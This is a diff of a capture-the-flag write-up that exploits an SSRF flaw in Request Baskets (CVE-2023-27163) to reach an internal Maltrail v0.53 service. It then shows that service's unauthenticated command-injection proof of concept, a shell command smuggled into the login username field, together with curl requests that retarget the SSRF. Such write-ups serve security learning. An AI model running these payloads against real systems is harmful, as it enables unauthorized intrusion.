@@ -73,15 +73,15 @@ so i tested GET and POST requests on the url using curl i didnt get a response i
 ```
 ![eq](https://github.com/0xRoqeeb/writeups/assets/49154037/a6bd4d84-8136-4da2-8ad2-3e4fcf09b3ee)
 
-so i created a new basket and intercepted the request with burp but it didn't reveal much
-after that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
+I created a new basket and intercepted the request with burpsuite ,it didn't reveal much.  
+After that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
 
 ```console
-POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
+POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}
 ```
 
 It turns out that the /api/baskets/name and /baskets/name are the  API endpoints vulnerable to unauthenticated SSRF.
-requests sent to the request basket url will be reflected on the url in the ***forward_url** parameter
+requests sent to the request basket url will be reflected on the url in the ***forward_url** parameter  
 
 you can do this with a curl command
 
@@ -93,17 +93,32 @@ but i'll be doing it directly from the web application, to do that we navigate t
 ![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/d181f742-6a23-4fa0-84e5-889fb4bf1c7f)
 
 on the configuration page we set the fields as follows
-***Forward URL***:*http://127.0.0.1:80/* to reveal any internal websites, this field will forward that website to our basket url
-***Proxy Response*** : *true* ( i set this field to false as the POC stated but i didn't get a response, it only made sense to set it to true)
-***Expand Forward Path*** : *true*
+***Forward URL***:*http://127.0.0.1:80/* to reveal any internal websites, this field will forward that website to our basket url  
+
+***Proxy Response*** : *true* ( i set this field to false as the POC stated but i didn't get a response, it only made sense to set it to true)  
+***Expand Forward Path*** : *true*  
 ![2023-07-25_11-20](https://github.com/0xRoqeeb/writeups/assets/49154037/80228ce7-f4a8-4c4d-b114-0077256fe719)
 
 after that click apply to save changes
 
-now we access our basket url again and this time we're seeing something different we come across a CSS starved website looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
-![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/81dda296-d4cb-4674-8582-11e69860ef24)
+now we access our bask
+et url again and this time we're seeing something different we come across a CSS starved website ,looking at the bottom left i found out this website was *Powered by Maltrail (v0.53)*
+![2023-07-25_13-03_1](https://github.com/0xRoqeeb/writeups/assets/49154037/81dda296-d4cb-4674-8582-11e69860ef24) 
+A bit of google and i found out this version was vulnerable to Unauthenticated OS Command Injection the username parameter in the */login* page
+POC
+```console
+curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
+```
+since we'll be testing the */login* page let's update our *forward_url*   
 
+Using a curl command
+```console
+curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/login","proxy_response": True,"insecure_tls": false,"expand_path": true,"capacity": 250}'
+```
+ or we can edit our existing basket from the basket configuration page
+ ![damn](https://github.com/0xRoqeeb/writeups/assets/49154037/f501ad73-66ec-474e-bf2f-db936cfa8363)
 
+ 
 
 
 
